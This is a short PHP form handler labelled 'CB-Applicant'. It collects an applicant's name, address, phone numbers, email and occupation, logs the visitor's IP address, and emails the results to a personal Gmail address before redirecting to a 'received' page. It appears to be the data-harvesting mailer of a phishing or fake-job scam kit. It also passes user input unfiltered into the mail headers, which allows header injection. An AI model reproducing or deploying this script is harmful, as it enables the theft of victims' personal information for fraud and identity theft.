<?php
//CB-Applicant

$first_name = $_POST['first_name'];
$last_name = $_POST['last_name'];
$phone = $_POST['phone'];
$address = $_POST['address'];
$city = $_POST['city'];
$state = $_POST['state'];
$zip_code = $_POST['zip_code'];
$email = $_POST['email'];
$mobile = $_POST['mobile'];
$occupation = $_POST['occupation'];
$subj = "CB-Applicant";
$from =$_POST['email'];
$ip = getenv("REMOTE_ADDR");
$msg = "Full Name: $first_name $last_name\nMailing Address : $address \nCity, State, Zip Code : $city $state $zip_code\nPhone Number : $phone\nMobile Phone : $mobile\nEmail : $email  \nOccupation : $occupation\nIP : $ip;
++++++++++++++++\n";
$from =$_POST['email'];
$to = "
edwardmilton2@gmail.com,$to";
mail($to, $subj, $msg, $from);
header("Location: received.htm");
